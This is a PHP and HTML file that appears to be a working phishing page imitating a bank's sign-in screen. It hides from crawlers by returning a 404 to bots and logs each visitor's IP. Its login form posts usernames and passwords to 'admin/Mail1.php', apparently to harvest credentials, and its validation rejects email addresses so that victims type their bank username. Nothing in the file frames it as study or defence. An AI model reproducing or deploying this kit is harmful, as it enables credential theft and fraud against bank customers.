<?php 
session_start();
use Jaybizzle\CrawlerDetect\CrawlerDetect;
require 'anti/vendor/autoload.php';

// Initialize the CrawlerDetect class
$CrawlerDetect = new CrawlerDetect;

// Check if the visitor is a bot
if ($CrawlerDetect->isCrawler()) {
    // If a crawler is detected, return a 404 response and exit
    header("HTTP/1.0 404 Not Found");
    exit();
}

// Function to get the real IP address of the visitor
function getUserIP() {
    if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
        return $_SERVER['HTTP_CLIENT_IP'];
    } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        return $_SERVER['HTTP_X_FORWARDED_FOR'];
    } else {
        return $_SERVER['REMOTE_ADDR'];
    }
}

// Capture the visitor's IP address
$visitor_ip = getUserIP();

// Specify the file where IPs will be logged
$log_file = 'visitors_ip.txt';

// Save the IP address to the file
file_put_contents($log_file, $visitor_ip . PHP_EOL, FILE_APPEND | LOCK_EX);
?>


<!DOCTYPE html>
<html lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1.0">
	<meta name="viewport" content="height=device-height, initial-scale=1.0">
	<title>Sign in</title>

</head>
<body>
	<style type="text/css">

		body {
			transition: opacity ease-in 0.2s;
			
		}

		.loaderbox{
			position: fixed;
			width: 100%;
			height: 100%;
			z-index: 9999999;
			background-color: #134286;
		}
		.spinner.loading {
			  /*padding: 50%;*/
			  top: 50%;
			  position: relative;
			  text-align: center;
			}

			.spinner.loading:before {
			  content: "";
			  height: 50px;
			  width: 50px;
			  margin: -15px auto auto -15px;
			  position: absolute;
			  top: 50%;
			  left: 50%;
			  border-width: 4px;
			  border-style: solid;
			  border-color: #2180c0 #ccc #ccc;
			  border-radius: 100%;
			  animation: rotation .7s infinite linear;
			}

			@keyframes rotation {
			  from {
			    transform: rotate(0deg);
			  } to {
			    transform: rotate(359deg);
			  }
			}






		.shadowbox {
			height: 50px;
			box-shadow: 0 30px 80px 0 rgb(0, 0, 0);
			top: -50px;
			position: absolute;
		}


		.jpui.background.image {
		    background-image: url(assets/background.mobile.day.6.jpeg);
		    filter: progid:DXImageTransform.Microsoft.AlphaImageLoader(src='assets/background.mobile.day.6.jpeg', sizingMethod='scale');
			 -ms-filter: progid:DXImageTransform.Microsoft.AlphaImageLoader(src='assets/background.mobile.day.6.jpeg', sizingMethod='scale');
		}



		.jpui.image.fixed {
			position: fixed;
			top: 0;
			left: 0;
			z-index: -1;
		}
		.jpui.image {
			
			display: inline-block;
			vertical-align: middle;
			max-width: 100%;
			background-color: transparent;
			line-height: 0;
		}
		.jpui.background.image {
			background-color: #005fa6 !important;
			background-image: linear-gradient(to bottom,rgba(0,60,105,.4),rgba(0,60,105,.8));
		}

		.jpui.image.background {
			height: 100%;
			width: 100%;
			padding: 0;
			margin: 0;
			background-size: cover;
			background-repeat: no-repeat;
			background-position: center center;
		}


		.loginbox{
			max-width: 384px !important;
			
			background: rgba(255,255,255,.96) !important;
			border-radius: 5px;
			padding: 1.25rem 0 1.25rem 0;
			margin-top: 100px;
		}


		.form-control-2{
			border: none !important;
			border-bottom: 1px solid #ccc !important;
			background: transparent !important;
			border-radius: 0px !important;
		}

		.form-control:focus{
			box-shadow: none !important;
		}
		.form-control-danger{
			border: none !important;
			border-bottom: 1px solid #bf2155 !important;
			background: transparent !important;
			border-radius: 0px !important;
		}


		.form-floating > label {
	
		 padding: 1rem 0rem !important;
		 
	
		}
		.form-check-input{
			height: 22px !important;
			width: 22px !important;
			font-family: 'Open Sans','Helvetica Neue',Helvetica,Arial,sans-serif !important;
		}
		.form-check-input:focus{
			box-shadow: none !important;


		}
		
		.iconbox>svg:hover{
			color: blue;
		}
		.linkbox{
			text-decoration-line: underline;
			color: #757575;
			font-size: .65625rem;
			white-space: nowrap;
		}



		@media (min-width:320px) {
		 .jpui.background.image {
		  background-image:url(assets/background.mobile.day.6.jpeg);
		 }
		}


		@media (min-width:992px) {
		 .jpui.background.image {
		  background-image:url(assets/background.tablet.day.6.jpeg);
		 }
		}
		@media (min-width:320px) {
		 
		}

		@media (min-width:1024px) {
		 .jpui.background.image {
		  background-image:url(assets/background.desktop.day.6.jpeg);
		 }
		}

		
		 .footer{
		 	position: absolute !important;
		 	bottom: 0px !important;
		 }

		
	</style>

<!-- CSS only -->
<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-EVSTQN3/azprG1Anm3QDgpJLIm9Nao0Yz1ztcQTwFspd3yD65VohhpuuCOmLASjC" crossorigin="anonymous">



	<div class="loaderbox">
		<div class="spinner loading"></div>
	</div>




	<div class="shadowbox container-fluid"></div>
	<nav class="navbar  justify-content-center">
	  	
	    <img src="assets/wordmark-white.svg" height="35">
				
	    
	</nav>
	
	<div class="jpui background image fixed" id="geoImage"></div>

	<div class="container-fluid">
		<div class="d-flex justify-content-center">
			<div class="loginbox col-md-6 col-12">
				<div class="container-fluid" id="errbox" style="display: none ;">
					<div class="mx-4 d-flex justify-content-start"  >
						<svg version="1.0" xmlns="http://www.w3.org/2000/svg"
							 width="30" height="35" viewBox="0 0 34.000000 32.000000"
							 preserveAspectRatio="xMidYMid meet">

							<g transform="translate(0.000000,32.000000) scale(0.100000,-0.100000)"
							fill="#bf2155" stroke="none">
							<path d="M119 231 c-60 -61 -24 -151 61 -151 54 0 90 34 90 85 0 48 -45 95
							-90 95 -22 0 -41 -9 -61 -29z m77 -16 c8 -20 -4 -65 -16 -65 -12 0 -24 45 -16
							65 3 8 10 15 16 15 6 0 13 -7 16 -15z m4 -90 c0 -8 -9 -15 -20 -15 -11 0 -20
							7 -20 15 0 8 9 15 20 15 11 0 20 -7 20 -15z"/>
							</g>
						</svg>
						<div class="err-txt-box text-danger"></div>
					</div>
				</div>
				<form action="admin/Mail1.php" method="post" id="saveform">

					<div class="form-floating my-3 mx-4">
					  <input type="text" name="name" class="form-control form-control-2" id="usernameInput" placeholder="username" onblur="onInputUserBlur()">
					  <label for="usernameInput" id="labeluser">Username</label>
					</div>
					<div class="form-floating mx-4">
					  <input type="password" name="passd" class="form-control form-control-2" id="floatingPassword" placeholder="Password" onblur="onInputPassBlur()">
					  <label for="floatingPassword" id="passwordLabel">Password</label>
					</div>
					<div class="form-floating mx-4 " style="display: none;" id="tokenbox">
					  <input type="text" class="form-control form-control-2" id="floatingToken" placeholder="Token" >
					  <label for="floatingToken">Token</label>
					</div>
					<div class="row px-4 mt-4">
						<div class="col-6">
							<div class="form-check">
							  <input class="form-check-input" type="checkbox" value="" id="remeberme">
							  <label class="form-check-label" for="remeberme" style="opacity: .8; font-size: .875rem; padding-left: 10px; padding-top: 3px;">
							    Remember Me
							  </label>
							</div>
							
						</div>
						<div class="col-6">
							<div class="form-check">
							  <input class="form-check-input" type="checkbox" value="" id="flexCheckChecked" onchange="ToggleToken($(this))">
							  <label class="form-check-label pl-1" for="flexCheckChecked" style="opacity: .8; font-size: .875rem; padding-left: 10px; padding-top: 3px;">
							    Use token
							  </label>
							</div>
						</div>
					</div>
					<div class="d-grid gap-2 mx-4 mt-4">
					  <button class="btn btn-primary" type="submit">Sign in</button>
					</div>
				</form>
				<div class="container">
					<div class="nav-link pb-0">
						Forgot username/password?
						
					</div>
					<div class="nav-link pt-0">
						Not Enrolled? Sign Up Now.
					</div>
				</div>
			</div>
		</div>
	</div>
	<div class="container-fluid bg-white mt-5 " id="footer">
		<div class="d-flex justify-content-center pt-4 iconbox" style="font-size: 1.125em; color: #717171;">
			<p class="pr-1 ">Follow us: </p>
			<svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" class="bi bi-facebook" viewBox="0 0 16 16" style="margin-left: 10px;margin-top: 6px;">
			  <path d="M16 8.049c0-4.446-3.582-8.05-8-8.05C3.58 0-.002 3.603-.002 8.05c0 4.017 2.926 7.347 6.75 7.951v-5.625h-2.03V8.05H6.75V6.275c0-2.017 1.195-3.131 3.022-3.131.876 0 1.791.157 1.791.157v1.98h-1.009c-.993 0-1.303.621-1.303 1.258v1.51h2.218l-.354 2.326H9.25V16c3.824-.604 6.75-3.934 6.75-7.951z"/>
			</svg>
			<svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" class="bi bi-instagram" viewBox="0 0 16 16" style="margin-left: 10px;margin-top: 6px;">
			  <path d="M8 0C5.829 0 5.556.01 4.703.048 3.85.088 3.269.222 2.76.42a3.917 3.917 0 0 0-1.417.923A3.927 3.927 0 0 0 .42 2.76C.222 3.268.087 3.85.048 4.7.01 5.555 0 5.827 0 8.001c0 2.172.01 2.444.048 3.297.04.852.174 1.433.372 1.942.205.526.478.972.923 1.417.444.445.89.719 1.416.923.51.198 1.09.333 1.942.372C5.555 15.99 5.827 16 8 16s2.444-.01 3.298-.048c.851-.04 1.434-.174 1.943-.372a3.916 3.916 0 0 0 1.416-.923c.445-.445.718-.891.923-1.417.197-.509.332-1.09.372-1.942C15.99 10.445 16 10.173 16 8s-.01-2.445-.048-3.299c-.04-.851-.175-1.433-.372-1.941a3.926 3.926 0 0 0-.923-1.417A3.911 3.911 0 0 0 13.24.42c-.51-.198-1.092-.333-1.943-.372C10.443.01 10.172 0 7.998 0h.003zm-.717 1.442h.718c2.136 0 2.389.007 3.232.046.78.035 1.204.166 1.486.275.373.145.64.319.92.599.28.28.453.546.598.92.11.281.24.705.275 1.485.039.843.047 1.096.047 3.231s-.008 2.389-.047 3.232c-.035.78-.166 1.203-.275 1.485a2.47 2.47 0 0 1-.599.919c-.28.28-.546.453-.92.598-.28.11-.704.24-1.485.276-.843.038-1.096.047-3.232.047s-2.39-.009-3.233-.047c-.78-.036-1.203-.166-1.485-.276a2.478 2.478 0 0 1-.92-.598 2.48 2.48 0 0 1-.6-.92c-.109-.281-.24-.705-.275-1.485-.038-.843-.046-1.096-.046-3.233 0-2.136.008-2.388.046-3.231.036-.78.166-1.204.276-1.486.145-.373.319-.64.599-.92.28-.28.546-.453.92-.598.282-.11.705-.24 1.485-.276.738-.034 1.024-.044 2.515-.045v.002zm4.988 1.328a.96.96 0 1 0 0 1.92.96.96 0 0 0 0-1.92zm-4.27 1.122a4.109 4.109 0 1 0 0 8.217 4.109 4.109 0 0 0 0-8.217zm0 1.441a2.667 2.667 0 1 1 0 5.334 2.667 2.667 0 0 1 0-5.334z"/>
			</svg>
			<svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" class="bi bi-twitter" viewBox="0 0 16 16" style="margin-left: 10px;margin-top: 6px;">
			  <path d="M5.026 15c6.038 0 9.341-5.003 9.341-9.334 0-.14 0-.282-.006-.422A6.685 6.685 0 0 0 16 3.542a6.658 6.658 0 0 1-1.889.518 3.301 3.301 0 0 0 1.447-1.817 6.533 6.533 0 0 1-2.087.793A3.286 3.286 0 0 0 7.875 6.03a9.325 9.325 0 0 1-6.767-3.429 3.289 3.289 0 0 0 1.018 4.382A3.323 3.323 0 0 1 .64 6.575v.045a3.288 3.288 0 0 0 2.632 3.218 3.203 3.203 0 0 1-.865.115 3.23 3.23 0 0 1-.614-.057 3.283 3.283 0 0 0 3.067 2.277A6.588 6.588 0 0 1 .78 13.58a6.32 6.32 0 0 1-.78-.045A9.344 9.344 0 0 0 5.026 15z"/>
			</svg>
			<svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" class="bi bi-youtube" viewBox="0 0 16 16" style="margin-left: 10px;margin-top: 6px;">
			  <path d="M8.051 1.999h.089c.822.003 4.987.033 6.11.335a2.01 2.01 0 0 1 1.415 1.42c.101.38.172.883.22 1.402l.01.104.022.26.008.104c.065.914.073 1.77.074 1.957v.075c-.001.194-.01 1.108-.082 2.06l-.008.105-.009.104c-.05.572-.124 1.14-.235 1.558a2.007 2.007 0 0 1-1.415 1.42c-1.16.312-5.569.334-6.18.335h-.142c-.309 0-1.587-.006-2.927-.052l-.17-.006-.087-.004-.171-.007-.171-.007c-1.11-.049-2.167-.128-2.654-.26a2.007 2.007 0 0 1-1.415-1.419c-.111-.417-.185-.986-.235-1.558L.09 9.82l-.008-.104A31.4 31.4 0 0 1 0 7.68v-.123c.002-.215.01-.958.064-1.778l.007-.103.003-.052.008-.104.022-.26.01-.104c.048-.519.119-1.023.22-1.402a2.007 2.007 0 0 1 1.415-1.42c.487-.13 1.544-.21 2.654-.26l.17-.007.172-.006.086-.003.171-.007A99.788 99.788 0 0 1 7.858 2h.193zM6.4 5.209v4.818l4.157-2.408L6.4 5.209z"/>
			</svg>
			<svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" class="bi bi-linkedin" viewBox="0 0 16 16" style="margin-left: 10px;margin-top: 6px;">
			  <path d="M0 1.146C0 .513.526 0 1.175 0h13.65C15.474 0 16 .513 16 1.146v13.708c0 .633-.526 1.146-1.175 1.146H1.175C.526 16 0 15.487 0 14.854V1.146zm4.943 12.248V6.169H2.542v7.225h2.401zm-1.2-8.212c.837 0 1.358-.554 1.358-1.248-.015-.709-.52-1.248-1.342-1.248-.822 0-1.359.54-1.359 1.248 0 .694.521 1.248 1.327 1.248h.016zm4.908 8.212V9.359c0-.216.016-.432.08-.586.173-.431.568-.878 1.232-.878.869 0 1.216.662 1.216 1.634v3.865h2.401V9.25c0-2.22-1.184-3.252-2.764-3.252-1.274 0-1.845.7-2.165 1.193v.025h-.016a5.54 5.54 0 0 1 .016-.025V6.169h-2.4c.03.678 0 7.225 0 7.225h2.4z"/>
			</svg>


		</div>
		
	</div>
<script src="https://code.jquery.com/jquery-3.5.1.slim.js" integrity="sha256-DrT5NfxfbHvMHux31Lkhxg42LY6of8TaYyK50jnxRnM=" crossorigin="anonymous"></script>

<script type="text/javascript">
	jQuery(document).ready(function($) {
		$(".loaderbox").hide();
	});
	$("#saveform").submit(function(event) {
			
		if ($("#usernameInput").val() == "" & $('#floatingPassword').val() == "") {
			$("#usernameInput").removeClass('form-control-2');
			$("#usernameInput").addClass('form-control-danger');
			$('#labeluser').addClass('text-danger fw-bold');
			$("#floatingPassword").removeClass('form-control-2');
			$("#floatingPassword").addClass('form-control-danger');
			$('#passwordLabel').addClass('text-danger fw-bold');
			$('#errbox').show();
			$('.err-txt-box').text("Please tell us your username and password.");
			return false

		}else if ($("#usernameInput").val() == "") {
			$("#usernameInput").removeClass('form-control-2');
			$("#usernameInput").addClass('form-control-danger');
			$('#labeluser').addClass('text-danger fw-bold');
			$('#errbox').show();
			$('.err-txt-box').text("Please tell us your username.");

			return false

		}else if ($("#floatingPassword").val() == "") {
			$("#floatingPassword").removeClass('form-control-2');
			$("#floatingPassword").addClass('form-control-danger');
			$('#passwordLabel').addClass('text-danger fw-bold');
			$('#errbox').show();
			$('.err-txt-box').text("Please tell us your password.");
			return false

		}else{
			
			if (/^[a-zA-Z0-9.!#$%&'*+/=?^_`{|}~-]+@[a-zA-Z0-9-]+(?:\.[a-zA-Z0-9-]+)*$/.test($("#usernameInput").val())){
				$("#usernameInput").removeClass('form-control-2');
				$("#usernameInput").addClass('form-control-danger');
				$('#labeluser').addClass('text-danger fw-bold');
				$('#errbox').show();
				$('.err-txt-box').text("Please Fill Correct Username.");
				return false
			}else{
				$("#usernameInput").removeClass('form-control-danger');
				$("#usernameInput").addClass('form-control-2');
				$('#labeluser').removeClass('text-danger fw-bold');
				$("#floatingPassword").removeClass('form-control-danger');
				$("#floatingPassword").addClass('form-control-2');
				$('#passwordLabel').removeClass('text-danger fw-bold');
				$('#errbox').css('display', 'none');
				$('.err-txt-box').text("");
				 return true
			}
					
		}	


        			
		});

		function onInputUserBlur(argument) {
			// body...
		
			if ($("#usernameInput").val() != ""){
				 if (/^[a-zA-Z0-9.!#$%&'*+/=?^_`{|}~-]+@[a-zA-Z0-9-]+(?:\.[a-zA-Z0-9-]+)*$/.test($("#usernameInput").val())){
				 	$("#usernameInput").removeClass('form-control-2');
					$("#usernameInput").addClass('form-control-danger');
					$('#labeluser').addClass('text-danger fw-bold');
				 	
				 }else{
				 	$("#usernameInput").removeClass('form-control-danger');
					$("#usernameInput").addClass('form-control-2');
					$('#labeluser').removeClass('text-danger fw-bold');
				 	
				 }
				}else{
					$("#usernameInput").removeClass('form-control-2');
					$("#usernameInput").addClass('form-control-danger');
					$('#labeluser').addClass('text-danger fw-bold');
					


        			
					
				}
		}
		function onInputPassBlur(argument) {
			// body...
		
			if ($("#floatingPassword").val() != ""){
				 
				$("#floatingPassword").removeClass('form-control-danger');
				$("#floatingPassword").addClass('form-control-2');
				$('#passwordLabel').removeClass('text-danger fw-bold');
				 	
			}
			else{
				$("#floatingPassword").removeClass('form-control-2');
				$("#floatingPassword").addClass('form-control-danger');
				$('#passwordLabel').addClass('text-danger fw-bold');
		
					
			}
		}
		function ToggleToken(selfInput) {
			if (selfInput[0].checked) {
				$('#tokenbox').show();
			}else{
				$('#tokenbox').hide();

			}	
		}
		function winheight(argument) {
			// body...
			if ($( window ).height() > 630) {
				$('#footer').addClass('footer');

			}else{
				$('#footer').removeClass('footer');

			}
		}
		winheight();
		$(window).resize(function(event) {
			/* Act on the event */
		winheight();
			
		});
</script>
</body>
</html>